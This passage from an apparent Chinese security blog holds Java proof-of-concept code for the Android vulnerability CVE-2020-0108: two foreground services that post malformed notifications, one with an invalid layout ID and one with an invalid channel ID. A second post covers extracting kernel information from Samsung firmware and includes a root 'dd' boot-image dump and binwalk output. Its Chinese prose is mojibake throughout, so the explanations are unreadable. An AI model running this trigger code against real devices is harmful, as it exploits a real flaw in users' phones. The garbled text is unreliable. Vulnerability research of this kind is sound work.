class="line">        <span class="type">NotificationManager</span> <span class="variable">notificationManager</span> <span class="operator">=</span> (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line">        <span class="type">NotificationChannel</span> <span class="variable">notificationChannel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(<span class="string">&quot;c01&quot;</span>, <span class="string">&quot;CVE-2020-0108&quot;</span>, NotificationManager.IMPORTANCE_DEFAULT);</span><br><span class="line">        notificationChannel.setDescription(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>);</span><br><span class="line">        notificationChannel.enableLights(<span class="literal">true</span>);</span><br><span class="line">        notificationChannel.setLightColor(Color.RED);</span><br><span class="line">        notificationChannel.enableVibration(<span class="literal">true</span>);</span><br><span class="line">        notificationChannel.setVibrationPattern(<span class="keyword">new</span> <span class="title class_">long</span>[]&#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">300</span>, <span class="number">200</span>, <span class="number">100</span>&#125;);</span><br><span class="line">        notificationManager.createNotificationChannel(notificationChannel);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//        Create a RemoteViews object with a invalid layout ID</span></span><br><span class="line">        <span class="type">RemoteViews</span> <span class="variable">remoteViews</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteViews</span>(getPackageName(), -<span class="number">1</span> <span class="comment">/* A Invalid Layout ID */</span>);</span><br><span class="line">        <span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;c01&quot;</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;If you see this means you device is not vulnerable&quot;</span>)</span><br><span class="line">                .setCustomBigContentView(remoteViews)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.drawable.ic_launcher_foreground)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), 	R.drawable.ic_launcher_foreground))</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">1</span>, notification);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyRunnable</span>()).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;onNotificationError&quot;</span>,<span class="string">&quot;Run Count: &quot;</span> + i);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´2-1"><a href="#æ¼æ´2-1" class="headerlink" title="æ¼æ´2"></a>æ¼æ´2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FServiceB</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;FServiceB&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line"><span class="comment">//        Handle the exception in main loop</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Looper.loop();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="comment">//        Create a Notification object with a invalid channel ID</span></span><br><span class="line">        <span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;InvalidInvalidInvalid&quot;</span> <span class="comment">/* A Invalid Channel ID */</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;If you see this means you device is not vulnerable&quot;</span>)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.drawable.ic_launcher_foreground)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">2</span>, notification);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyRunnable</span>()).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;postNotification&quot;</span>,<span class="string">&quot;Run Count: &quot;</span> + i);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-23T12:48:38.000Z" title="2022/6/23 20:48:38">2022-06-23</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-23T14:09:18.888Z" title="2022/6/23 22:09:18">2022-06-23</time></span><span class="level-item">22 minutes read (About 3326 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/23/Android%E5%86%85%E6%A0%B8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">Androidå†…æ ¸ä¿¡æ¯æ”¶é›†</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨éªŒè¯Androidå†…æ ¸æ¼æ´æ—¶ï¼Œæ¶‰åŠåˆ°ç®—å†…æ ¸å‡½æ•°æˆ–æ•°æ®ç»“æ„åç§»çš„é—®é¢˜ï¼Œå‘ç°æ²¡æœ‰è¿™æ–¹é¢çš„çŸ¥è¯†å‚¨å¤‡ï¼Œäºæ˜¯å‡†å¤‡æ”¶é›†æ•´ç†è®°å½•è¿™æ–¹é¢çš„çŸ¥è¯†ã€‚</p>
<h2 id="ä¸‰æ˜Ÿå›ºä»¶åŒ…"><a href="#ä¸‰æ˜Ÿå›ºä»¶åŒ…" class="headerlink" title="ä¸‰æ˜Ÿå›ºä»¶åŒ…"></a>ä¸‰æ˜Ÿå›ºä»¶åŒ…</h2><p>è§£å‹äº†ä¸€ä¸ªä¸‰æ˜Ÿçš„å›ºä»¶åŒ…ä¸­çš„<code>AP_G9730ZCU5FUC2_CL21058543_QB38745533_REV00_user_low_ship_MULTI_CERT_meta_OS11.tar.md5</code></p>
<blockquote>
<p><code>.tar.md5</code>æŒ‡çš„æ˜¯å‹ç¼©å·²éªŒè¯ï¼ŒTARæ–‡ä»¶åŒ…å«å›ºä»¶å’Œå…¶ä»–ç³»ç»Ÿæ•°æ®ï¼Œè€Œ<code>.MD5</code> æ‰©å±•ç¨‹åºéªŒè¯æ²¡æœ‰æ•°æ®æŸåï¼Œè¿™æ˜¯ä¸‰æ˜Ÿçš„æ ¼å¼</p>
<p>ç›´æ¥å°† <code>.tar.md5</code> é‡å‘½åä¸º <code>.tar</code>ï¼Œç„¶åå†ç”¨ Odin åˆ·å…¥ï¼Œå°±ä¸ä¼šæ ¡éªŒäº†ï¼Œä¸ç®¡è¿™ä¸ªçº¿åˆ·åŒ…æœ‰æ²¡æœ‰åš <code>.tar.md5</code> çš„æ­¥éª¤ã€‚</p>
</blockquote>
<p>ç„¶åå¾—åˆ°äº†ä»¥ä¸‹æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">d-----                meta-data</span><br><span class="line">-a----       23656325 boot.img.lz4</span><br><span class="line">-a----           1292 dqmdbg.img.ext4.lz4</span><br><span class="line">-a----         953562 dtbo.img.lz4</span><br><span class="line">-a----           1923 persist.img.ext4.lz4</span><br><span class="line">-a----       37936471 recovery.img.lz4</span><br><span class="line">-a----     3299056890 system.img.ext4.lz4</span><br><span class="line">-a----     2190845341 userdata.img.ext4.lz4</span><br><span class="line">-a----           3447 vbmeta.img.lz4</span><br><span class="line">-a----      812012780 vendor.img.ext4.lz4</span><br></pre></td></tr></table></figure>

<h3 id="vbmetaé•œåƒçš„ä½œç”¨"><a href="#vbmetaé•œåƒçš„ä½œç”¨" class="headerlink" title="vbmetaé•œåƒçš„ä½œç”¨"></a>vbmetaé•œåƒçš„ä½œç”¨</h3><p>éªŒè¯å¯åŠ¨ï¼ˆ<code>Verified Boot</code>ï¼‰æ˜¯Androidä¸€ä¸ªé‡è¦çš„å®‰å…¨åŠŸèƒ½ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®¿é—®å¯åŠ¨é•œåƒè¢«ç¯¡æ”¹ï¼Œæé«˜ç³»ç»Ÿçš„æŠ—æ”»å‡»èƒ½åŠ›ï¼Œç®€å•æè¿°åšæ³•å°±æ˜¯åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­å¢åŠ ä¸€æ¡æ ¡éªŒé“¾ï¼Œå³ <code>ROM code</code> æ ¡éªŒ <code>BootLoader</code>ï¼Œç¡®ä¿ <code>BootLoader</code> çš„åˆæ³•æ€§å’Œå®Œæ•´æ€§ï¼Œ<code>BootLoader</code> åˆ™éœ€è¦æ ¡éªŒ <code>boot image</code>ï¼Œç¡®ä¿ <code>Kernel</code> å¯åŠ¨æ‰€éœ€ <code>image</code> çš„åˆæ³•æ€§å’Œå®Œæ•´æ€§ï¼Œè€Œ <code>Kernel</code> åˆ™è´Ÿè´£æ ¡éªŒ <code>System</code> åˆ†åŒºå’Œ <code>vendor</code> åˆ†åŒºã€‚</p>
<p>ç”±äº <code>ROM code</code> å’Œ <code>BootLoader</code> é€šå¸¸éƒ½æ˜¯ç”±è®¾å¤‡å‚å•† OEM æä¾›ï¼Œè€Œå„å®¶å®é™…åšæ³•å’Œç ”å‘èƒ½åŠ›ä¸å°½ç›¸åŒï¼Œä¸ºäº†è®©è®¾å¤‡å‚å•†æ›´æ–¹ä¾¿çš„å¼•å…¥ Verified boot åŠŸèƒ½ï¼ŒGoogle åœ¨ Android Oä¸Šæ¨å‡ºäº†ä¸€ä¸ªç»Ÿä¸€çš„éªŒè¯å¯åŠ¨æ¡†æ¶ <code>Android verified boot 2.0</code>ï¼Œå¥½å¤„æ˜¯æ—¢ä¿è¯äº†åŸºäºè¯¥æ¡†æ¶å¼€å‘çš„<code>verified boot</code> åŠŸèƒ½èƒ½å¤Ÿæ»¡è¶³ CDD è¦æ±‚ï¼Œä¹Ÿä¿ç•™äº†å„å®¶ OEM å®šåˆ¶å¯åŠ¨æ ¡éªŒæµç¨‹çš„å¼¹æ€§ã€‚</p>
<p>ç”±äº <code>ROM code</code> æ ¡éªŒ <code>BootLoader</code>  çš„åŠŸèƒ½é€šå¸¸ä¸ ICçš„è®¾è®¡ç›¸å…³ï¼Œæ‰€ä»¥ AVB 2.0 å…³æ³¨çš„é‡ç‚¹åœ¨ <code>BootLoader</code>  ä¹‹åçš„æ ¡éªŒæµç¨‹ã€‚<code>BootLoader</code>  ä¹‹åç³»ç»Ÿå¯åŠ¨æ‰€æ¶‰åŠçš„å…³é”®é•œåƒé€šå¸¸åŒ…æ‹¬ <code>boot.img</code>ï¼Œ<code>system.img</code>ï¼ŒAndroid O çš„ <code>treble Project</code> è¿˜å¼•å…¥äº† <code>dtbo </code>å’Œ <code>vendor.img</code>ã€‚è¿™äº› <code>image</code> æŒ¨ä¸ªæ ¡éªŒå¯ä»¥è¯´è´¹æ—¶è´¹åŠ›ï¼Œè€Œ AVB 2.0 çš„åšæ³•äº‹å®ä¸Šååˆ†ç®€å•ï¼Œå¼•å…¥ä¸€ä¸ªæ–°çš„åˆ†åŒºï¼š<code>vbmeta.img</code>ï¼ˆ<code>verified boot metadata</code>ï¼‰ï¼Œç„¶åæŠŠæ‰€æœ‰éœ€è¦æ ¡éªŒçš„å†…å®¹åœ¨ç¼–è¯‘æ—¶å°±è®¡ç®—å¥½æ‰“åŒ…åˆ°è¿™ä¸ªåˆ†åŒºï¼Œé‚£ä¹ˆå¯åŠ¨è¿‡ç¨‹ä¸­ <code>BootLoader</code> åªéœ€è¦æ ¡éªŒ <code>vbmeta.img</code>ï¼Œå°±èƒ½ç¡®è®¤ <code>vbmeta</code> å†…çš„æ•°æ®æ˜¯å¦å¯ä¿¡ã€‚å†ç”¨ <code>vbmeta</code> ä¸­çš„æ•°æ®å»æ¯”å¯¹ <code>bootimg</code>ï¼Œ<code>dtbo</code>ï¼Œ<code>system.img</code>ï¼Œ<code>vendor.img</code> å³å¯ã€‚è‡³äº OEM æ˜¯è¿˜éœ€è¦æ”¾ä»€ä¹ˆå…¶ä»–ä¸œè¥¿åˆ° <code>vbmeta</code> ä¸­ï¼Œåˆ™å¯ä»¥ç”± OEM è‡ªç”±å®šåˆ¶ï¼Œå¯ä»¥è¯´ä¿ç•™äº†å¾ˆå¥½çš„å®¢åˆ¶åŒ–ç©ºé—´ã€‚</p>
<p>é™¤äº†æœ€åŸºæœ¬çš„éªŒè¯å¯åŠ¨ä¹‹å¤–ï¼ŒAVB 2.0 è¿˜æä¾›é˜²æ­¢å›æ»šçš„åŠŸèƒ½å’Œå¯¹ABåˆ†åŒºå¤‡ä»½çš„æ”¯æŒï¼Œå…·ä½“çš„å¯ä»¥çœ‹READMEæ–‡æ¡£ï¼ˆå®‰å“æºç <code>external/avb/README.md</code>ï¼‰ã€‚</p>
<h3 id="dtboé•œåƒ"><a href="#dtboé•œåƒ" class="headerlink" title="dtboé•œåƒ"></a>dtboé•œåƒ</h3><p>è®¾å¤‡æ ‘ (DT) æ˜¯ç”¨äºæè¿°â€œä¸å¯å‘ç°â€ç¡¬ä»¶çš„å‘½åèŠ‚ç‚¹å’Œå±æ€§æ„æˆçš„ä¸€ç§æ•°æ®ç»“æ„ã€‚æ“ä½œç³»ç»Ÿï¼ˆä¾‹å¦‚åœ¨ Android ä¸­ä½¿ç”¨çš„ Linux å†…æ ¸ï¼‰ä¼šä½¿ç”¨ DT æ¥æ”¯æŒ Android è®¾å¤‡ä½¿ç”¨çš„å„ç§ç¡¬ä»¶é…ç½®ã€‚ç¡¬ä»¶ä¾›åº”å•†ä¼šæä¾›è‡ªå·±çš„ DT æºæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥ Linux ä¼šå°†è¿™äº›æ–‡ä»¶ç¼–è¯‘åˆ°å¼•å¯¼åŠ è½½ç¨‹åºä½¿ç”¨çš„è®¾å¤‡æ ‘ <code>Blob (DTB)</code> æ–‡ä»¶ä¸­ã€‚</p>
<p>å‚è€ƒå®˜æ–¹æ–‡æ¡£<a target="_blank" rel="noopener" href="https://source.android.com/devices/architecture/dto">è®¾å¤‡æ ‘å åŠ å±‚</a>ã€‚</p>
<h1 id="System-é•œåƒä»‹ç»"><a href="#System-é•œåƒä»‹ç»" class="headerlink" title="System é•œåƒä»‹ç»"></a>System é•œåƒä»‹ç»</h1><p>System é•œåƒä¸€èˆ¬æœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§ä¸º <code>ext4 image</code>ï¼Œä¸€ç§ä¸º <code>sparse image</code>ã€‚</p>
<p>çº¿åˆ·åŒ…ä¸­çš„ <code>system image</code>ï¼Œé‡‡ç”¨çš„æ˜¯ <code>sparse image</code> æ ¼å¼ï¼Œè€Œåˆ·å…¥å®Œæˆç›´æ¥é‡‡ç”¨ <code>dd</code> æˆ– <code>cat</code> å‘½ä»¤å¤‡ä»½å‡ºæ¥ï¼Œåˆ™æ˜¯ <code>ext4</code> æ ¼å¼ã€‚</p>
<h1 id="Androidå†…æ ¸é…ç½®æå–"><a href="#Androidå†…æ ¸é…ç½®æå–" class="headerlink" title="Androidå†…æ ¸é…ç½®æå–"></a>Androidå†…æ ¸é…ç½®æå–</h1><p><code>/proc/config.gz</code></p>
<h1 id="CPUä¿¡æ¯"><a href="#CPUä¿¡æ¯" class="headerlink" title="CPUä¿¡æ¯"></a>CPUä¿¡æ¯</h1><p><code>/sys/devices/system/cpu/</code></p>
<p><code>cat /sys/devices/system/cpu/cpu7/cpufreq/cpuinfo_max_freq</code></p>
<h1 id="androidç³»ç»Ÿçš„åˆ†åŒº"><a href="#androidç³»ç»Ÿçš„åˆ†åŒº" class="headerlink" title="androidç³»ç»Ÿçš„åˆ†åŒº"></a>androidç³»ç»Ÿçš„åˆ†åŒº</h1><p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªåˆ†åŒºå¦‚ä¸‹ï¼š</p>
<p>1ã€<code>/boot</code>åˆ†åŒºï¼šè¯¥åˆ†åŒºä¸»è¦åŒ…å«<code>android kernel</code>é•œåƒå’Œ<code>ramdisk</code>ï¼ˆä¸€ç§å°†RAMæ¨¡æ‹Ÿä¸ºç¡¬ç›˜çš„æŠ€æœ¯ï¼Œæé«˜è®¿é—®é€Ÿåº¦ï¼‰ã€‚</p>
<p>2ã€<code>/system</code>åˆ†åŒºï¼šè¯¥åˆ†åŒºä¸»è¦å­˜æ”¾<code>Android</code>æ¡†æ¶åŠå…¶ç›¸å…³é…ç½®ï¼ŒåŒ…å«ç³»ç»Ÿé¢„è£…çš„<code>app</code>ã€‚</p>
<p>3ã€<code>/recovery</code>åˆ†åŒºï¼šè¯¥åˆ†åŒºä¸»è¦æ˜¯å¤‡ä»½çš„åˆ†åŒº</p>
<p>4ã€<code>/data</code> ç”¨æˆ·æ•°æ®çš„å­˜å‚¨åŒºåŸŸ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/data/app/com.xxxx/           ä»¥åŒ…åå­˜æ”¾åº”ç”¨å®‰è£…æ–‡ä»¶ï¼ŒåŒ…æ‹¬base.apk </span><br><span class="line">/lib/data/data/com.xxxx/      å­˜æ”¾åº”ç”¨æ•°æ®ï¼ŒåŒ…æ‹¬spã€dbç­‰</span><br><span class="line">/data/dalvik-cache            ä»¥åŒ…åå­˜æ”¾ä¼˜åŒ–è¿‡çš„åº”ç”¨dexæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>5ã€<code>/cache</code>åˆ†åŒºï¼šAndroidç³»ç»Ÿç¼“å­˜åŒºåŸŸï¼Œä¿å­˜ç³»ç»Ÿæœ€å¸¸è®¿é—®çš„æ•°æ®å’Œåº”ç”¨ç¨‹åºã€‚</p>
<p>6ã€<code>/misc</code>åˆ†åŒºï¼šæ­¤åˆ†åŒºåŒ…å«ä¸€äº›ç³»ç»ŸåŠŸèƒ½è®¾ç½®å¼€å…³å’Œæ•°æ®ï¼Œæ¯”å¦‚USBè®¾ç½®ã€‚</p>
<p>7ã€<code>/sdcard</code>åˆ†åŒºï¼šå¤–ç½®å­˜å‚¨åˆ†åŒº</p>
<p>8ã€<code>/vendor</code>åˆ†åŒºï¼šå‚å•†å®šåˆ¶çš„åˆ†åŒºï¼Œå‚å•†çš„æŸäº›ç³»ç»Ÿå‡çº§å¯ä»¥é€šè¿‡è¿™ä¸ªåˆ†åŒºæ¥å®ç°ã€‚</p>
<h1 id="boot-img"><a href="#boot-img" class="headerlink" title="boot.img"></a>boot.img</h1><p><code>boot.img</code>å°±æ˜¯<code>android</code>ç³»ç»Ÿçš„<code>Linux</code>å†…æ ¸ä¸»è¦çš„é•œåƒæ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­å¤§è‡´åŒ…å«<code>boot header</code>ï¼Œ<code>kernel</code>ï¼Œ<code>ramdisk</code>ã€‚</p>
<p><code>boot.img</code>æ–‡ä»¶è·³è¿‡<code>2K</code>çš„æ–‡ä»¶å¤´ä¹‹åï¼ŒåŒ…å«ä¸¤ä¸ª<code>gz</code>å‹ç¼©åŒ…ï¼Œä¸€ä¸ªæ˜¯<code>boot.img-kernel.gz Linux</code>å†…æ ¸ï¼Œä¸€ä¸ªæ˜¯<code>boot.img-ramdisk.cpio.gz</code>ï¼Œç„¶ååŠ ä¸Š<code>ramdisk</code>æ–‡ä»¶ã€‚<code>boot.img</code>æ–‡ä»¶åœ¨é’ˆå¯¹<code>kernel</code>æ˜¯æœ‰ä¸åŒå‹ç¼©ç®—æ³•æ¥è¿›è¡Œå‹ç¼©çš„ã€‚</p>
<p>å¤§è‡´çš„ç»“æ„å›¾å¦‚ä¸‹</p>
<p><img src="https://bbs.pediy.com/upload/attach/202103/849527_BB97KK7ZN7U8ZXD.png"></p>
<h2 id="ADBæå–booté•œåƒ"><a href="#ADBæå–booté•œåƒ" class="headerlink" title="ADBæå–booté•œåƒ"></a>ADBæå–booté•œåƒ</h2><p>ä»æ‰‹æœºä¸­æå–éœ€è¦ç”¨åˆ°<code>root</code>æƒé™ï¼Œè¿™å¯¹å®é™…æ¼æ´æ¥è®²æœ‰äº›è‹›åˆ»ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/by-name/boot of=/sdcard/boot.img</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨ ADB æ‹–åˆ°ç”µè„‘å¤‡ç”¨.</p>
<h2 id="binwalkè§£åŒ…"><a href="#binwalkè§£åŒ…" class="headerlink" title="binwalkè§£åŒ…"></a>binwalkè§£åŒ…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> Â» python3 /usr/local/lib/python3.8/dist-packages/binwalk-2.3.3-py3.8.egg/binwalk boot.img</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Android bootimg, kernel size: 50209697 bytes, kernel addr: 0x8000, ramdisk size: 0 bytes, ramdisk addr: 0x0, product name: <span class="string">&quot;RILRI20B005&quot;</span></span><br><span class="line">169252        0x29524         SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">185108        0x2D314         SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">188820        0x2E194         AES Inverse S-Box</span><br><span class="line">16556401      0xFCA171        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 21129</span><br><span class="line">24670228      0x1787014       ELF, 64-bit LSB shared object, version 1 (SYSV)</span><br><span class="line">24693124      0x178C984       gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null <span class="built_in">date</span>)</span><br><span class="line">25614492      0x186D89C       Compiled Java class data, version 0.0</span><br><span class="line">25621020      0x186F21C       Compiled Java class data, version 0.0</span><br><span class="line">25644484      0x1874DC4       Compiled Java class data, version 0.0</span><br><span class="line">25651012      0x1876744       Compiled Java class data, version 0.0</span><br><span class="line">25876272      0x18AD730       Zlib compressed data, compressed</span><br><span class="line">25877304      0x18ADB38       Zlib compressed data, compressed</span><br><span class="line">25877824      0x18ADD40       Zlib compressed data, default compression</span><br><span class="line">25878856      0x18AE148       Zlib compressed data, default compression</span><br><span class="line">25895274      0x18B216A       Private key <span class="keyword">in</span> DER format (PKCS header length: 4, sequence length: 799</span><br><span class="line">25972564      0x18C4F54       DES SP2, little endian</span><br><span 